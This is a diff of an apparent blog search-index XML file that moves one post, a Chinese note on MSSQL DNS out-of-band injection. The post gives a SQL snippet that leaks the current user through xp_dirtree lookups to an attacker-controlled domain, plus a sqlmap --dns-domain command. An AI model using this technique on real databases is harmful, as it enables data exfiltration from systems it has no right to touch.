@@ -207,25 +207,6 @@
     
     
     <entry>
-      <title>DNS Log 杂记</title>
-      <link href="/2018/09/19/DNSlog/"/>
-      <url>/2018/09/19/DNSlog/</url>
-      
-        <content type="html"><![CDATA[<ol><li><p>public 能执行 xp_dirtree 函数 (可以用来dns 回显注入)</p></li><li><p>public 权限下不能列任何目录(网上很多文章说public能列)</p><a id="more"></a></li><li><p>mssql dns 回显注入： 网上教程说需要两个域名，实际一个域名就可以:) 配置域名： </p></li></ol><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images%2FDnslog.PNG" alt="domain"></p><p>条件：支持多语句执行  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);</span><br><span class="line">  <span class="keyword">SELECT</span> @host=(<span class="keyword">SELECT</span> <span class="keyword">CURRENT_USER</span></span><br><span class="line">+<span class="string">'bind.google.com'</span>);</span><br><span class="line">  EXEC('master..xp_dirtree</span><br><span class="line">"\\'+@host+'\foobar$"');</span><br></pre></td></tr></table></figure><p>远程外网服务器监听： <code>./sqlmap/lib/request/dns.py</code> 即可有回显结果</p><ol start="4"><li>sqlmap 可直接利用dns 回显注入来突破鸡肋的延时注入</li></ol><p><code>sqlmap --dns-domain bind.google.com(你的域名)</code></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> dnslog sqlmap </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>获取http信息小工具</title>
       <link href="/2018/09/19/httpinfo-tool/"/>
       <url>/2018/09/19/httpinfo-tool/</url>
@@ -237,6 +218,25 @@
         <tags>
             
             <tag> http </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>DNS Log 杂记</title>
+      <link href="/2018/09/19/DNSlog/"/>
+      <url>/2018/09/19/DNSlog/</url>
+      
+        <content type="html"><![CDATA[<ol><li><p>public 能执行 xp_dirtree 函数 (可以用来dns 回显注入)</p></li><li><p>public 权限下不能列任何目录(网上很多文章说public能列)</p><a id="more"></a></li><li><p>mssql dns 回显注入： 网上教程说需要两个域名，实际一个域名就可以:) 配置域名： </p></li></ol><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images%2FDnslog.PNG" alt="domain"></p><p>条件：支持多语句执行  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);</span><br><span class="line">  <span class="keyword">SELECT</span> @host=(<span class="keyword">SELECT</span> <span class="keyword">CURRENT_USER</span></span><br><span class="line">+<span class="string">'bind.google.com'</span>);</span><br><span class="line">  EXEC('master..xp_dirtree</span><br><span class="line">"\\'+@host+'\foobar$"');</span><br></pre></td></tr></table></figure><p>远程外网服务器监听： <code>./sqlmap/lib/request/dns.py</code> 即可有回显结果</p><ol start="4"><li>sqlmap 可直接利用dns 回显注入来突破鸡肋的延时注入</li></ol><p><code>sqlmap --dns-domain bind.google.com(你的域名)</code></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> dnslog sqlmap </tag>
             
         </tags>
       
